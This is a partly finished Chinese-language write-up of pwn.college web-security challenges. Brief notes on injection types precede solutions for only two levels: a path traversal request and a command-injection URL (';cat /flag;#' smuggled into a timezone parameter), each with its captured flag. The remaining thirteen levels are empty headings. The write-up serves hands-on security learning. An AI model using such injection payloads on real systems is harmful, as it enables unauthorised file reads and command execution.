# Knoeledge
需要知道web服务器都能干什么事

SQL，大名鼎鼎的SQL注入

命令注入

HTML，也就是注入部分JavaScript

C语言的堆栈注入

总的来说就是利用Web服务器会执行一些语句（部分参数来自于我们的输入），来进行操作。

Origin的概念：(<shceme>,<host>,<post>)
（http, exapmle.com,80）

HTML-embeds、域名、站点等概念，基本上都是计算机网络的内容
# WP

## level1 Exploit a path traversal vulnerability
这个其实我找不到太好的方法，只能猜，猜到了就是了
```
hacker@web-security-level-1:~$ curl http://challenge.localhost:80/?path=/flag
pwn.college{4MSrtxHJYUF2_wAz81iNV6UtM5K.ddDOzMDL2QjMyMzW}
hacker@web-security-level-1:~$
```
## level2 Exploit a command injection vulnerability
这个十分简单，就是一个简单的命令注入，只需要让前面的命令闭合即可
```
hacker@web-security-level-2:~$ curl "http://challenge.localhost:80/?timezone=;cat%20/flag;#"
pwn.college{o0h_efJ2CAv60AmeSOoPYGrZKBs.dhDOzMDL2QjMyMzW}
Mon Jul 24 07:17:20 UTC 2023
```
## level3 Exploit an authentication bypass vulnerability


```

```
## level4 Exploit a structured query language injection vulnerability to login


```

```
## level5 Exploit a structured query language injection vulnerability to leak data


```

```
## level6 Exploit a structured query language injection vulnerability with an unknown database structure


```

```
## level7 Exploit a structured query language injection vulnerability to blindly leak data


```

```
## level8 Exploit a cross site scripting vulnerability


```

```
## level9 Exploit a cross site scripting vulnerability with more complicated context


```

```
## level10 Exploit a cross site scripting vulnerability to cause a user action


```

```
## level11 Exploit a cross site request forgery vulnerability

```

```
## level12 Exploit a cross site request forgery vulnerability where the request must POST


```

```
## level13 Exploit a cross site scripting vulnerability to exfilitrate user session data


```

```
## level14 Exploit a cross site scripting vulnerability to exfilitrate user data


```

```
## level15 Exploit a (memory corruption) stack injection vulnerability


```

```